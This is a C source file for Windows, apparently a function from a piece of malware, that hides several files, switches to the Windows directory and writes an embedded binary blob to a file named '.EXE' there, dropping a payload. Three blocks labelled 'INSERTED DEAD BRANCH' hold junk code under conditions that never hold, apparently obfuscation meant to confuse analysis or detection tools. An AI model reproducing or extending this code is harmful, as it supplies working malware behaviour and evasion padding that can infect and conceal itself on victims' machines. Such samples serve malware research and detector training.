#include "data_globals.h"
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void _HideFiles(void)
{
    HANDLE hFile;

    // --- INSERTED DEAD BRANCH 1 (Math Invariant, Category A: System info) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char userName[256];
        DWORD size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            volatile int dummyUse = userName[0];
        }
        char compName[256];
        size = sizeof(compName);
        if (GetComputerNameA(compName, &size)) {
            volatile int dummyUse = compName[0];
        }
        volatile DWORD dummySum = 0;
        for (int i = 0; i < 10; i++) {
            dummySum += si.dwNumberOfProcessors + st.wHour;
        }
        // read existing local variable (hFile is uninitialized but we can cast to int)
        volatile int readLocal = (int)(DWORD)hFile;
        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&st, sizeof(st));
    }

    SetFileAttributesA(_windoze2, FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributesA(_sysdoze2, FILE_ATTRIBUTE_HIDDEN);
    _chdir(_windir);

    // --- INSERTED DEAD BRANCH 2 (Combination, Category B: Memory & string) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char* dummyBuf = (char*)malloc(64);
        if (dummyBuf) {
            sprintf_s(dummyBuf, 64, "Dummy %d", (int)dummy_tick_2);
            size_t len = strlen(dummyBuf);
            char* dummyBuf2 = (char*)malloc(len + 10);
            if (dummyBuf2) {
                memcpy(dummyBuf2, dummyBuf, len);
                memset(dummyBuf2 + len, 0, 10);
                volatile int hash = 0;
                for (int i = 0; i < (int)len; i++) {
                    hash = (hash * 31) + dummyBuf2[i];
                }
                // read existing local variable (hFile)
                volatile int readLocal2 = (int)(DWORD)hFile;
                free(dummyBuf2);
            }
            free(dummyBuf);
        }
        volatile char localBuf[32];
        memset((void*)localBuf, 0, sizeof(localBuf));
    }

    SetFileAttributesA("BBbLWDB.Bat", FILE_ATTRIBUTE_HIDDEN);

    strcpy(_L0NEPath, _windir);
    strcat(_L0NEPath, "\\.EXE");

    // --- INSERTED DEAD BRANCH 3 (System Query, Category C: Bitwise/Math loops) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile unsigned char dummyArr[32];
        for (int i = 0; i < 32; i++) {
            dummyArr[i] = (unsigned char)(i * 7);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int i = 0; i < 32; i++) {
            hash ^= dummyArr[i];
            hash *= 0x01000193;
        }
        volatile int xorSum = 0;
        for (int i = 0; i < 32; i++) {
            xorSum ^= dummyArr[i];
        }
        // read existing local variable (hFile)
        volatile int readLocal3 = (int)(DWORD)hFile;
        SecureZeroMemory((void*)dummyArr, sizeof(dummyArr));
        SYSTEM_INFO si2;
        GetSystemInfo(&si2);
        volatile DWORD dummyProc = si2.dwNumberOfProcessors;
    }

    hFile = CreateFileA(_L0NEPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, _L0NEInc, sizeof(_L0NEInc), NULL, NULL);
    CloseHandle(hFile);
}
